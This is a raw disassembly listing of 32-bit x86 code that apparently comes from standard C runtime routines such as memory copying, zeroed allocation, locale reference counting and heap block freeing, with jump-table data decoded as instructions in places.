  424788:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42478c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424790:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424794:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424798:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42479c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4247a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4247a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4247a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4247ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4247b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4247b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4247b8:	lea    eax,[ecx*4+0x0]
  4247bf:	add    esi,eax
  4247c1:	add    edi,eax
  4247c3:	jmp    DWORD PTR [edx*4+0x4247cc]
  4247ca:	mov    edi,edi
  4247cc:	fadd   QWORD PTR [edi+0x42]
  4247cf:	add    ah,ah
  4247d1:	inc    edi
  4247d2:	inc    edx
  4247d3:	add    al,dh
  4247d5:	inc    edi
  4247d6:	inc    edx
  4247d7:	add    BYTE PTR [eax+ecx*2],al
  4247da:	inc    edx
  4247db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4247e1:	leave  
  4247e2:	ret    
  4247e3:	nop
  4247e4:	mov    al,BYTE PTR [esi]
  4247e6:	mov    BYTE PTR [edi],al
  4247e8:	mov    eax,DWORD PTR [ebp+0x8]
  4247eb:	pop    esi
  4247ec:	pop    edi
  4247ed:	leave  
  4247ee:	ret    
  4247ef:	nop
  4247f0:	mov    al,BYTE PTR [esi]
  4247f2:	mov    BYTE PTR [edi],al
  4247f4:	mov    al,BYTE PTR [esi+0x1]
  4247f7:	mov    BYTE PTR [edi+0x1],al
  4247fa:	mov    eax,DWORD PTR [ebp+0x8]
  4247fd:	pop    esi
  4247fe:	pop    edi
  4247ff:	leave  
  424800:	ret    
  424801:	lea    ecx,[ecx+0x0]
  424804:	mov    al,BYTE PTR [esi]
  424806:	mov    BYTE PTR [edi],al
  424808:	mov    al,BYTE PTR [esi+0x1]
  42480b:	mov    BYTE PTR [edi+0x1],al
  42480e:	mov    al,BYTE PTR [esi+0x2]
  424811:	mov    BYTE PTR [edi+0x2],al
  424814:	mov    eax,DWORD PTR [ebp+0x8]
  424817:	pop    esi
  424818:	pop    edi
  424819:	leave  
  42481a:	ret    
  42481b:	nop
  42481c:	lea    esi,[ecx+esi*1-0x4]
  424820:	lea    edi,[ecx+edi*1-0x4]
  424824:	test   edi,0x3
  42482a:	jne    0x424850
  42482c:	shr    ecx,0x2
  42482f:	and    edx,0x3
  424832:	cmp    ecx,0x8
  424835:	jb     0x424844
  424837:	std    
  424838:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42483a:	cld    
  42483b:	jmp    DWORD PTR [edx*4+0x424968]
  424842:	mov    edi,edi
  424844:	neg    ecx
  424846:	jmp    DWORD PTR [ecx*4+0x424918]
  42484d:	lea    ecx,[ecx+0x0]
  424850:	mov    eax,edi
  424852:	mov    edx,0x3
  424857:	cmp    ecx,0x4
  42485a:	jb     0x424868
  42485c:	and    eax,0x3
  42485f:	sub    ecx,eax
  424861:	jmp    DWORD PTR [eax*4+0x42486c]
  424868:	jmp    DWORD PTR [ecx*4+0x424968]
  42486f:	nop
  424870:	jl     0x4248ba
  424872:	inc    edx
  424873:	add    BYTE PTR [eax-0x37ffbdb8],ah
  424879:	dec    eax
  42487a:	inc    edx
  42487b:	add    BYTE PTR [edx-0x2edcfcba],cl
  424881:	mov    BYTE PTR [edi+0x3],al
  424884:	sub    esi,0x1
  424887:	shr    ecx,0x2
  42488a:	sub    edi,0x1
  42488d:	cmp    ecx,0x8
  424890:	jb     0x424844
  424892:	std    
  424893:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424895:	cld    
  424896:	jmp    DWORD PTR [edx*4+0x424968]
  42489d:	lea    ecx,[ecx+0x0]
  4248a0:	mov    al,BYTE PTR [esi+0x3]
  4248a3:	and    edx,ecx
  4248a5:	mov    BYTE PTR [edi+0x3],al
  4248a8:	mov    al,BYTE PTR [esi+0x2]
  4248ab:	shr    ecx,0x2
  4248ae:	mov    BYTE PTR [edi+0x2],al
  4248b1:	sub    esi,0x2
  4248b4:	sub    edi,0x2
  4248b7:	cmp    ecx,0x8
  4248ba:	jb     0x424844
  4248bc:	std    
  4248bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248bf:	cld    
  4248c0:	jmp    DWORD PTR [edx*4+0x424968]
  4248c7:	nop
  4248c8:	mov    al,BYTE PTR [esi+0x3]
  4248cb:	and    edx,ecx
  4248cd:	mov    BYTE PTR [edi+0x3],al
  4248d0:	mov    al,BYTE PTR [esi+0x2]
  4248d3:	mov    BYTE PTR [edi+0x2],al
  4248d6:	mov    al,BYTE PTR [esi+0x1]
  4248d9:	shr    ecx,0x2
  4248dc:	mov    BYTE PTR [edi+0x1],al
  4248df:	sub    esi,0x3
  4248e2:	sub    edi,0x3
  4248e5:	cmp    ecx,0x8
  4248e8:	jb     0x424844
  4248ee:	std    
  4248ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248f1:	cld    
  4248f2:	jmp    DWORD PTR [edx*4+0x424968]
  4248f9:	lea    ecx,[ecx+0x0]
  4248fc:	sbb    al,0x49
  4248fe:	inc    edx
  4248ff:	add    BYTE PTR [ecx+ecx*2],ah
  424902:	inc    edx
  424903:	add    BYTE PTR [ecx+ecx*2],ch
  424906:	inc    edx
  424907:	add    BYTE PTR [ecx+ecx*2],dh
  42490a:	inc    edx
  42490b:	add    BYTE PTR [ecx+ecx*2],bh
  42490e:	inc    edx
  42490f:	add    BYTE PTR [ecx+ecx*2+0x42],al
  424913:	add    BYTE PTR [ecx+ecx*2+0x42],cl
  424917:	add    BYTE PTR [edi+0x49],bl
  42491a:	inc    edx
  42491b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424921:	inc    esp
  424922:	(bad)  
  424923:	sbb    al,0x8b
  424925:	inc    esp
  424926:	mov    ds,WORD PTR [eax]
  424928:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42492c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424930:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424934:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424938:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42493c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  424940:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  424944:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  424948:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42494c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  424950:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  424954:	lea    eax,[ecx*4+0x0]
  42495b:	add    esi,eax
  42495d:	add    edi,eax
  42495f:	jmp    DWORD PTR [edx*4+0x424968]
  424966:	mov    edi,edi
  424968:	js     0x4249b3
  42496a:	inc    edx
  42496b:	add    BYTE PTR [eax-0x6fffbdb7],al
  424971:	dec    ecx
  424972:	inc    edx
  424973:	add    BYTE PTR [ecx+ecx*2+0x458b0042],ah
  42497a:	or     BYTE PTR [esi+0x5f],bl
  42497d:	leave  
  42497e:	ret    
  42497f:	nop
  424980:	mov    al,BYTE PTR [esi+0x3]
  424983:	mov    BYTE PTR [edi+0x3],al
  424986:	mov    eax,DWORD PTR [ebp+0x8]
  424989:	pop    esi
  42498a:	pop    edi
  42498b:	leave  
  42498c:	ret    
  42498d:	lea    ecx,[ecx+0x0]
  424990:	mov    al,BYTE PTR [esi+0x3]
  424993:	mov    BYTE PTR [edi+0x3],al
  424996:	mov    al,BYTE PTR [esi+0x2]
  424999:	mov    BYTE PTR [edi+0x2],al
  42499c:	mov    eax,DWORD PTR [ebp+0x8]
  42499f:	pop    esi
  4249a0:	pop    edi
  4249a1:	leave  
  4249a2:	ret    
  4249a3:	nop
  4249a4:	mov    al,BYTE PTR [esi+0x3]
  4249a7:	mov    BYTE PTR [edi+0x3],al
  4249aa:	mov    al,BYTE PTR [esi+0x2]
  4249ad:	mov    BYTE PTR [edi+0x2],al
  4249b0:	mov    al,BYTE PTR [esi+0x1]
  4249b3:	mov    BYTE PTR [edi+0x1],al
  4249b6:	mov    eax,DWORD PTR [ebp+0x8]
  4249b9:	pop    esi
  4249ba:	pop    edi
  4249bb:	leave  
  4249bc:	ret    
  4249bd:	push   DWORD PTR [esp+0x4]
  4249c1:	call   DWORD PTR ds:0x4280dc
  4249c7:	xor    eax,eax
  4249c9:	inc    eax
  4249ca:	ret    0x8
  4249cd:	push   0x10
  4249cf:	push   0x4285f8
  4249d4:	call   0x423940
  4249d9:	mov    eax,ds:0x45fe68
  4249de:	test   eax,eax
  4249e0:	jne    0x424a19
  4249e2:	cmp    DWORD PTR ds:0x45fba4,0x1
  4249e9:	je     0x424a0f
  4249eb:	push   0x4285e4
  4249f0:	call   DWORD PTR ds:0x428014
  4249f6:	test   eax,eax
  4249f8:	je     0x424a0f
  4249fa:	push   0x4285bc
  4249ff:	push   eax
  424a00:	call   DWORD PTR ds:0x428010
  424a06:	mov    ds:0x45fe68,eax
  424a0b:	test   eax,eax
  424a0d:	jne    0x424a19
  424a0f:	mov    eax,0x4249bd
  424a14:	mov    ds:0x45fe68,eax
  424a19:	and    DWORD PTR [ebp-0x4],0x0
  424a1d:	push   DWORD PTR [ebp+0xc]
  424a20:	push   DWORD PTR [ebp+0x8]
  424a23:	call   eax
  424a25:	mov    DWORD PTR [ebp-0x1c],eax
  424a28:	jmp    0x424a4e
  424a2a:	mov    eax,DWORD PTR [ebp-0x14]
  424a2d:	mov    eax,DWORD PTR [eax]
  424a2f:	mov    eax,DWORD PTR [eax]
  424a31:	mov    DWORD PTR [ebp-0x20],eax
  424a34:	xor    eax,eax
  424a36:	inc    eax
  424a37:	ret    
  424a38:	mov    esp,DWORD PTR [ebp-0x18]
  424a3b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  424a42:	jne    0x424a4c
  424a44:	push   0x8
  424a46:	call   DWORD PTR ds:0x4280a0
  424a4c:	xor    eax,eax
  424a4e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a52:	call   0x42397b
  424a57:	ret    
  424a58:	push   0x10
  424a5a:	push   0x428608
  424a5f:	call   0x423940
  424a64:	mov    esi,DWORD PTR [ebp+0x8]
  424a67:	imul   esi,DWORD PTR [ebp+0xc]
  424a6b:	mov    DWORD PTR [ebp-0x1c],esi
  424a6e:	test   esi,esi
  424a70:	jne    0x424a73
  424a72:	inc    esi
  424a73:	xor    edi,edi
  424a75:	mov    DWORD PTR [ebp-0x20],edi
  424a78:	cmp    esi,0xffffffe0
  424a7b:	ja     0x424ae2
  424a7d:	cmp    DWORD PTR ds:0x460224,0x3
  424a84:	jne    0x424acd
  424a86:	add    esi,0xf
  424a89:	and    esi,0xfffffff0
  424a8c:	mov    DWORD PTR [ebp+0xc],esi
  424a8f:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a92:	cmp    ebx,DWORD PTR ds:0x45ffe4
  424a98:	ja     0x424acd
  424a9a:	push   0x4
  424a9c:	call   0x423aff
  424aa1:	pop    ecx
  424aa2:	and    DWORD PTR [ebp-0x4],edi
  424aa5:	push   ebx
  424aa6:	call   0x425501
  424aab:	pop    ecx
  424aac:	mov    DWORD PTR [ebp-0x20],eax
  424aaf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424ab3:	call   0x424b02
  424ab8:	mov    edi,DWORD PTR [ebp-0x20]
  424abb:	test   edi,edi
  424abd:	je     0x424ad1
  424abf:	push   DWORD PTR [ebp-0x1c]
  424ac2:	push   0x0
  424ac4:	push   edi
  424ac5:	call   0x426240
  424aca:	add    esp,0xc
  424acd:	test   edi,edi
  424acf:	jne    0x424b0b
  424ad1:	push   esi
  424ad2:	push   0x8
  424ad4:	push   DWORD PTR ds:0x460220
  424ada:	call   DWORD PTR ds:0x4280d8
  424ae0:	mov    edi,eax
  424ae2:	test   edi,edi
  424ae4:	jne    0x424b0b
  424ae6:	cmp    DWORD PTR ds:0x45fea8,edi
  424aec:	je     0x424b0b
  424aee:	push   esi
  424aef:	call   0x426222
  424af4:	pop    ecx
  424af5:	test   eax,eax
  424af7:	jne    0x424a73
  424afd:	jmp    0x424b0d
  424aff:	mov    esi,DWORD PTR [ebp+0xc]
  424b02:	push   0x4
  424b04:	call   0x423a6b
  424b09:	pop    ecx
  424b0a:	ret    
  424b0b:	mov    eax,edi
  424b0d:	call   0x42397b
  424b12:	ret    
  424b13:	push   esi
  424b14:	mov    esi,DWORD PTR [esp+0x8]
  424b18:	mov    eax,DWORD PTR [esi+0x3c]
  424b1b:	push   edi
  424b1c:	xor    edi,edi
  424b1e:	cmp    eax,DWORD PTR ds:0x45feb4
  424b24:	je     0x424b89
  424b26:	cmp    eax,edi
  424b28:	je     0x424b89
  424b2a:	mov    eax,DWORD PTR [esi+0x2c]
  424b2d:	cmp    DWORD PTR [eax],edi
  424b2f:	jne    0x424b89
  424b31:	mov    eax,DWORD PTR [esi+0x34]
  424b34:	cmp    eax,edi
  424b36:	je     0x424b54
  424b38:	cmp    DWORD PTR [eax],edi
  424b3a:	jne    0x424b54
  424b3c:	cmp    eax,DWORD PTR ds:0x45ffd0
  424b42:	je     0x424b54
  424b44:	push   eax
  424b45:	call   0x42454a
  424b4a:	push   DWORD PTR [esi+0x3c]
  424b4d:	call   0x42648f
  424b52:	pop    ecx
  424b53:	pop    ecx
  424b54:	mov    eax,DWORD PTR [esi+0x30]
  424b57:	cmp    eax,edi
  424b59:	je     0x424b77
  424b5b:	cmp    DWORD PTR [eax],edi
  424b5d:	jne    0x424b77
  424b5f:	cmp    eax,DWORD PTR ds:0x45ffd4
  424b65:	je     0x424b77
  424b67:	push   eax
  424b68:	call   0x42454a
  424b6d:	push   DWORD PTR [esi+0x3c]
  424b70:	call   0x426430
  424b75:	pop    ecx
  424b76:	pop    ecx
  424b77:	push   DWORD PTR [esi+0x2c]
  424b7a:	call   0x42454a
  424b7f:	push   DWORD PTR [esi+0x3c]
  424b82:	call   0x42454a
  424b87:	pop    ecx
  424b88:	pop    ecx
  424b89:	mov    eax,DWORD PTR [esi+0x40]
  424b8c:	cmp    eax,DWORD PTR ds:0x45ffcc
  424b92:	je     0x424bac
  424b94:	cmp    eax,edi
  424b96:	je     0x424bac
  424b98:	cmp    DWORD PTR [eax],edi
  424b9a:	jne    0x424bac
  424b9c:	push   eax
  424b9d:	call   0x42454a
  424ba2:	push   DWORD PTR [esi+0x44]
  424ba5:	call   0x42454a
  424baa:	pop    ecx
  424bab:	pop    ecx
  424bac:	mov    eax,DWORD PTR [esi+0x50]
  424baf:	cmp    eax,DWORD PTR ds:0x45feb0
  424bb5:	je     0x424bd3
  424bb7:	cmp    eax,edi
  424bb9:	je     0x424bd3
  424bbb:	cmp    DWORD PTR [eax+0xb4],edi
  424bc1:	jne    0x424bd3
  424bc3:	push   eax
  424bc4:	call   0x4262a0
  424bc9:	push   DWORD PTR [esi+0x50]
  424bcc:	call   0x42454a
  424bd1:	pop    ecx
  424bd2:	pop    ecx
  424bd3:	push   esi
  424bd4:	call   0x42454a
  424bd9:	pop    ecx
  424bda:	pop    edi
  424bdb:	pop    esi
  424bdc:	ret    
  424bdd:	push   esi
  424bde:	call   0x4237f3
  424be3:	mov    esi,eax
  424be5:	mov    eax,DWORD PTR [esi+0x64]
  424be8:	cmp    eax,DWORD PTR ds:0x45f66c
  424bee:	je     0x424c9a
  424bf4:	test   eax,eax
  424bf6:	je     0x424c27
  424bf8:	mov    ecx,DWORD PTR [eax+0x2c]
  424bfb:	dec    DWORD PTR [eax]
  424bfd:	test   ecx,ecx
  424bff:	je     0x424c03
  424c01:	dec    DWORD PTR [ecx]
  424c03:	mov    ecx,DWORD PTR [eax+0x34]
  424c06:	test   ecx,ecx
  424c08:	je     0x424c0c
  424c0a:	dec    DWORD PTR [ecx]
  424c0c:	mov    ecx,DWORD PTR [eax+0x30]
  424c0f:	test   ecx,ecx
  424c11:	je     0x424c15
  424c13:	dec    DWORD PTR [ecx]
  424c15:	mov    ecx,DWORD PTR [eax+0x40]
  424c18:	test   ecx,ecx
  424c1a:	je     0x424c1e
  424c1c:	dec    DWORD PTR [ecx]
  424c1e:	mov    ecx,DWORD PTR [eax+0x4c]
  424c21:	dec    DWORD PTR [ecx+0xb4]
  424c27:	mov    ecx,DWORD PTR ds:0x45f66c
  424c2d:	mov    DWORD PTR [esi+0x64],ecx
  424c30:	mov    ecx,DWORD PTR ds:0x45f66c
  424c36:	inc    DWORD PTR [ecx]
  424c38:	mov    ecx,DWORD PTR ds:0x45f66c
  424c3e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424c41:	test   ecx,ecx
  424c43:	je     0x424c47
  424c45:	inc    DWORD PTR [ecx]
  424c47:	mov    ecx,DWORD PTR ds:0x45f66c
  424c4d:	mov    ecx,DWORD PTR [ecx+0x34]
  424c50:	test   ecx,ecx
  424c52:	je     0x424c56
  424c54:	inc    DWORD PTR [ecx]
  424c56:	mov    ecx,DWORD PTR ds:0x45f66c
  424c5c:	mov    ecx,DWORD PTR [ecx+0x30]
  424c5f:	test   ecx,ecx
  424c61:	je     0x424c65
  424c63:	inc    DWORD PTR [ecx]
  424c65:	mov    ecx,DWORD PTR ds:0x45f66c
  424c6b:	mov    ecx,DWORD PTR [ecx+0x40]
  424c6e:	test   ecx,ecx
  424c70:	je     0x424c74
  424c72:	inc    DWORD PTR [ecx]
  424c74:	mov    ecx,DWORD PTR ds:0x45f66c
  424c7a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424c7d:	inc    DWORD PTR [ecx+0xb4]
  424c83:	test   eax,eax
  424c85:	je     0x424c9a
  424c87:	cmp    DWORD PTR [eax],0x0
  424c8a:	jne    0x424c9a
  424c8c:	cmp    eax,0x45f618
  424c91:	je     0x424c9a
  424c93:	push   eax
  424c94:	call   0x424b13
  424c99:	pop    ecx
  424c9a:	mov    eax,DWORD PTR [esi+0x64]
  424c9d:	pop    esi
  424c9e:	ret    
  424c9f:	push   0xc
  424ca1:	push   0x428798
  424ca6:	call   0x423940
  424cab:	push   0xc
  424cad:	call   0x423aff
  424cb2:	pop    ecx
  424cb3:	and    DWORD PTR [ebp-0x4],0x0
  424cb7:	call   0x424bdd
  424cbc:	mov    DWORD PTR [ebp-0x1c],eax
  424cbf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424cc3:	call   0x424cd1
  424cc8:	mov    eax,DWORD PTR [ebp-0x1c]
  424ccb:	call   0x42397b
  424cd0:	ret    
  424cd1:	push   0xc
  424cd3:	call   0x423a6b
  424cd8:	pop    ecx
  424cd9:	ret    
  424cda:	push   0x140
  424cdf:	push   0x0
  424ce1:	push   DWORD PTR ds:0x460220
  424ce7:	call   DWORD PTR ds:0x4280d8
  424ced:	test   eax,eax
  424cef:	mov    ds:0x45ffe0,eax
  424cf4:	jne    0x424cf7
  424cf6:	ret    
  424cf7:	mov    ecx,DWORD PTR [esp+0x4]
  424cfb:	and    DWORD PTR ds:0x45ffd8,0x0
  424d02:	and    DWORD PTR ds:0x45ffdc,0x0
  424d09:	mov    ds:0x45ffe8,eax
  424d0e:	xor    eax,eax
  424d10:	mov    DWORD PTR ds:0x45ffe4,ecx
  424d16:	mov    DWORD PTR ds:0x45ffec,0x10
  424d20:	inc    eax
  424d21:	ret    
  424d22:	mov    eax,ds:0x45ffdc
  424d27:	lea    ecx,[eax+eax*4]
  424d2a:	mov    eax,ds:0x45ffe0
  424d2f:	lea    ecx,[eax+ecx*4]
  424d32:	jmp    0x424d46
  424d34:	mov    edx,DWORD PTR [esp+0x4]
  424d38:	sub    edx,DWORD PTR [eax+0xc]
  424d3b:	cmp    edx,0x100000
  424d41:	jb     0x424d4c
  424d43:	add    eax,0x14
  424d46:	cmp    eax,ecx
  424d48:	jb     0x424d34
  424d4a:	xor    eax,eax
  424d4c:	ret    
  424d4d:	push   ebp
  424d4e:	mov    ebp,esp
  424d50:	sub    esp,0x10
  424d53:	mov    ecx,DWORD PTR [ebp+0x8]
  424d56:	mov    eax,DWORD PTR [ecx+0x10]
  424d59:	push   esi
  424d5a:	mov    esi,DWORD PTR [ebp+0xc]
  424d5d:	push   edi
  424d5e:	mov    edi,esi
  424d60:	sub    edi,DWORD PTR [ecx+0xc]
  424d63:	add    esi,0xfffffffc
  424d66:	shr    edi,0xf
  424d69:	mov    ecx,edi
  424d6b:	imul   ecx,ecx,0x204
  424d71:	lea    ecx,[ecx+eax*1+0x144]
  424d78:	mov    DWORD PTR [ebp-0x10],ecx
  424d7b:	mov    ecx,DWORD PTR [esi]
  424d7d:	dec    ecx
  424d7e:	test   cl,0x1
  424d81:	mov    DWORD PTR [ebp-0x4],ecx
  424d84:	jne    0x425061
  424d8a:	push   ebx
  424d8b:	lea    ebx,[ecx+esi*1]
  424d8e:	mov    edx,DWORD PTR [ebx]
  424d90:	mov    DWORD PTR [ebp-0xc],edx
  424d93:	mov    edx,DWORD PTR [esi-0x4]
  424d96:	mov    DWORD PTR [ebp-0x8],edx
  424d99:	mov    edx,DWORD PTR [ebp-0xc]
  424d9c:	test   dl,0x1
  424d9f:	mov    DWORD PTR [ebp+0xc],ebx
  424da2:	jne    0x424e18
  424da4:	sar    edx,0x4
  424da7:	dec    edx
  424da8:	cmp    edx,0x3f
  424dab:	jbe    0x424db0
  424dad:	push   0x3f
  424daf:	pop    edx
  424db0:	mov    ecx,DWORD PTR [ebx+0x4]
  424db3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424db6:	jne    0x424dfa
  424db8:	cmp    edx,0x20
  424dbb:	mov    ebx,0x80000000
  424dc0:	jae    0x424ddb
  424dc2:	mov    ecx,edx
  424dc4:	shr    ebx,cl
  424dc6:	lea    ecx,[edx+eax*1+0x4]
  424dca:	not    ebx
  424dcc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424dd0:	dec    BYTE PTR [ecx]
  424dd2:	jne    0x424df7
  424dd4:	mov    ecx,DWORD PTR [ebp+0x8]
  424dd7:	and    DWORD PTR [ecx],ebx
  424dd9:	jmp    0x424df7
  424ddb:	lea    ecx,[edx-0x20]
  424dde:	shr    ebx,cl
  424de0:	lea    ecx,[edx+eax*1+0x4]
  424de4:	not    ebx
  424de6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424ded:	dec    BYTE PTR [ecx]
  424def:	jne    0x424df7
  424df1:	mov    ecx,DWORD PTR [ebp+0x8]
  424df4:	and    DWORD PTR [ecx+0x4],ebx
  424df7:	mov    ebx,DWORD PTR [ebp+0xc]
  424dfa:	mov    edx,DWORD PTR [ebx+0x8]
  424dfd:	mov    ebx,DWORD PTR [ebx+0x4]
  424e00:	mov    ecx,DWORD PTR [ebp-0x4]
  424e03:	add    ecx,DWORD PTR [ebp-0xc]
  424e06:	mov    DWORD PTR [edx+0x4],ebx
  424e09:	mov    edx,DWORD PTR [ebp+0xc]
  424e0c:	mov    ebx,DWORD PTR [edx+0x4]
  424e0f:	mov    edx,DWORD PTR [edx+0x8]
  424e12:	mov    DWORD PTR [ebx+0x8],edx
  424e15:	mov    DWORD PTR [ebp-0x4],ecx
  424e18:	mov    edx,ecx
  424e1a:	sar    edx,0x4
  424e1d:	dec    edx
  424e1e:	cmp    edx,0x3f
  424e21:	jbe    0x424e26
  424e23:	push   0x3f
  424e25:	pop    edx
  424e26:	mov    ebx,DWORD PTR [ebp-0x8]
  424e29:	and    ebx,0x1
  424e2c:	mov    DWORD PTR [ebp-0xc],ebx
  424e2f:	jne    0x424ec4
  424e35:	sub    esi,DWORD PTR [ebp-0x8]
  424e38:	mov    ebx,DWORD PTR [ebp-0x8]
  424e3b:	sar    ebx,0x4
  424e3e:	push   0x3f
  424e40:	mov    DWORD PTR [ebp+0xc],esi
  424e43:	dec    ebx
  424e44:	pop    esi
  424e45:	cmp    ebx,esi
  424e47:	jbe    0x424e4b
  424e49:	mov    ebx,esi
  424e4b:	add    ecx,DWORD PTR [ebp-0x8]
  424e4e:	mov    edx,ecx
  424e50:	sar    edx,0x4
  424e53:	dec    edx
  424e54:	cmp    edx,esi
  424e56:	mov    DWORD PTR [ebp-0x4],ecx
  424e59:	jbe    0x424e5d
  424e5b:	mov    edx,esi
  424e5d:	cmp    ebx,edx
  424e5f:	je     0x424ebf
  424e61:	mov    ecx,DWORD PTR [ebp+0xc]
  424e64:	mov    esi,DWORD PTR [ecx+0x4]
  424e67:	cmp    esi,DWORD PTR [ecx+0x8]
  424e6a:	jne    0x424ea7
  424e6c:	cmp    ebx,0x20
  424e6f:	mov    esi,0x80000000
  424e74:	jae    0x424e8d
  424e76:	mov    ecx,ebx
  424e78:	shr    esi,cl
  424e7a:	not    esi
  424e7c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424e80:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e84:	jne    0x424ea7
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	and    DWORD PTR [ecx],esi
  424e8b:	jmp    0x424ea7
  424e8d:	lea    ecx,[ebx-0x20]
  424e90:	shr    esi,cl
  424e92:	not    esi
  424e94:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e9b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e9f:	jne    0x424ea7
  424ea1:	mov    ecx,DWORD PTR [ebp+0x8]
  424ea4:	and    DWORD PTR [ecx+0x4],esi
  424ea7:	mov    ecx,DWORD PTR [ebp+0xc]
  424eaa:	mov    esi,DWORD PTR [ecx+0x8]
  424ead:	mov    ecx,DWORD PTR [ecx+0x4]
  424eb0:	mov    DWORD PTR [esi+0x4],ecx
  424eb3:	mov    ecx,DWORD PTR [ebp+0xc]
  424eb6:	mov    esi,DWORD PTR [ecx+0x4]
  424eb9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ebc:	mov    DWORD PTR [esi+0x8],ecx
  424ebf:	mov    esi,DWORD PTR [ebp+0xc]
  424ec2:	jmp    0x424ec7
  424ec4:	mov    ebx,DWORD PTR [ebp+0x8]
  424ec7:	cmp    DWORD PTR [ebp-0xc],0x0
  424ecb:	jne    0x424ed5
  424ecd:	cmp    ebx,edx
  424ecf:	je     0x424f55
  424ed5:	mov    ecx,DWORD PTR [ebp-0x10]
  424ed8:	lea    ecx,[ecx+edx*8]
  424edb:	mov    ebx,DWORD PTR [ecx+0x4]
  424ede:	mov    DWORD PTR [esi+0x8],ecx
  424ee1:	mov    DWORD PTR [esi+0x4],ebx
  424ee4:	mov    DWORD PTR [ecx+0x4],esi
  424ee7:	mov    ecx,DWORD PTR [esi+0x4]
  424eea:	mov    DWORD PTR [ecx+0x8],esi
  424eed:	mov    ecx,DWORD PTR [esi+0x4]
  424ef0:	cmp    ecx,DWORD PTR [esi+0x8]
  424ef3:	jne    0x424f55
  424ef5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424ef9:	mov    BYTE PTR [ebp+0xf],cl
  424efc:	inc    cl
  424efe:	cmp    edx,0x20
  424f01:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424f05:	jae    0x424f2c
  424f07:	cmp    BYTE PTR [ebp+0xf],0x0
  424f0b:	jne    0x424f1b
  424f0d:	mov    ecx,edx
  424f0f:	mov    ebx,0x80000000
  424f14:	shr    ebx,cl
  424f16:	mov    ecx,DWORD PTR [ebp+0x8]
  424f19:	or     DWORD PTR [ecx],ebx
  424f1b:	mov    ebx,0x80000000
  424f20:	mov    ecx,edx
  424f22:	shr    ebx,cl
  424f24:	lea    eax,[eax+edi*4+0x44]
  424f28:	or     DWORD PTR [eax],ebx
  424f2a:	jmp    0x424f55
  424f2c:	cmp    BYTE PTR [ebp+0xf],0x0
  424f30:	jne    0x424f42
  424f32:	lea    ecx,[edx-0x20]
  424f35:	mov    ebx,0x80000000
  424f3a:	shr    ebx,cl
  424f3c:	mov    ecx,DWORD PTR [ebp+0x8]
  424f3f:	or     DWORD PTR [ecx+0x4],ebx
  424f42:	lea    ecx,[edx-0x20]
  424f45:	mov    edx,0x80000000
  424f4a:	shr    edx,cl
  424f4c:	lea    eax,[eax+edi*4+0xc4]
  424f53:	or     DWORD PTR [eax],edx
  424f55:	mov    eax,DWORD PTR [ebp-0x4]
  424f58:	mov    DWORD PTR [esi],eax
  424f5a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424f5e:	mov    eax,DWORD PTR [ebp-0x10]
  424f61:	dec    DWORD PTR [eax]
  424f63:	jne    0x425060
  424f69:	mov    eax,ds:0x45ffd8
  424f6e:	test   eax,eax
  424f70:	je     0x425052
  424f76:	mov    ecx,DWORD PTR ds:0x45fff0
  424f7c:	mov    esi,DWORD PTR ds:0x4280bc
  424f82:	push   0x4000
  424f87:	shl    ecx,0xf
  424f8a:	add    ecx,DWORD PTR [eax+0xc]
  424f8d:	mov    ebx,0x8000
  424f92:	push   ebx
  424f93:	push   ecx
  424f94:	call   esi
  424f96:	mov    ecx,DWORD PTR ds:0x45fff0
  424f9c:	mov    eax,ds:0x45ffd8
  424fa1:	mov    edx,0x80000000
  424fa6:	shr    edx,cl
  424fa8:	or     DWORD PTR [eax+0x8],edx
  424fab:	mov    eax,ds:0x45ffd8
  424fb0:	mov    eax,DWORD PTR [eax+0x10]
  424fb3:	mov    ecx,DWORD PTR ds:0x45fff0
  424fb9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424fc1:	mov    eax,ds:0x45ffd8
  424fc6:	mov    eax,DWORD PTR [eax+0x10]
